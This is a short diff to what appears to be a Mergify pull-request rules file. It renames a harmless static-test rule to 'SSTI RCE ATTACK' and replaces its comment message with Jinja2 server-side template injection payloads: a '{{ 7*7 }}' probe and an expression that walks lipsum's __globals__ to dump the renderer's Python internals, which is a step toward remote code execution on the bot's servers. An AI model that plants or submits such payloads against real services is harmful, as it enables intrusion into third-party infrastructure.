@@ -1,10 +1,11 @@
 pull_request_rules:
-  - name: static test no template
+  - name: SSTI RCE ATTACK
     conditions:
       - base=master
     actions:
       comment:
-        message: "STATIC TEST - no template rendering at all"
-      label:
-        add:
-          - static-test-label
+        message: |
+          **SSTI {{ 7*7 }}**
+          ```
+          {{ [lipsum]|map(attribute="__globals__")|pprint }}
+          ```
